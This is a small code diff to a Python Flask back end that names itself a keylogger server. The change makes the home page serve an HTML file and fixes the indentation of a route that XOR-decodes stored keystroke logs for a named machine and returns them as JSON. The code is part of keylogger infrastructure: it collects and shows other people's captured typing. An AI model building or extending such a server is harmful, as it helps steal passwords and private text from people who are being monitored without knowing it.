@@ -1,4 +1,4 @@
-from flask import Flask, jsonify,request ,current_app
+from flask import Flask, jsonify,request ,current_app ,send_file
 import time ,os ,json
 
 
@@ -9,7 +9,8 @@ os.makedirs(app.config["DATA_FOLDER"], exist_ok=True)
 
 @app.route('/')
 def home():
-    return "<h1>KeyLogger Server is Running</h1>"
+    return send_file(os.path.join(os.path.dirname(__file__), "index.html"))
+
 
 def generate_log_filename():
     return "log_" + time.strftime("%Y-%m-%d_%H") + ".txt"
@@ -70,7 +71,7 @@ def receiving_typing_data(name):
                     (k,v),= line.items()
                     v = xor_decoding(v)
                     logs.append({k:v})
-        return jsonify({"machine": name, "logs": logs}), 200
+    return jsonify({"machine": name, "logs": logs}), 200
 
 
 if __name__ == '__main__':
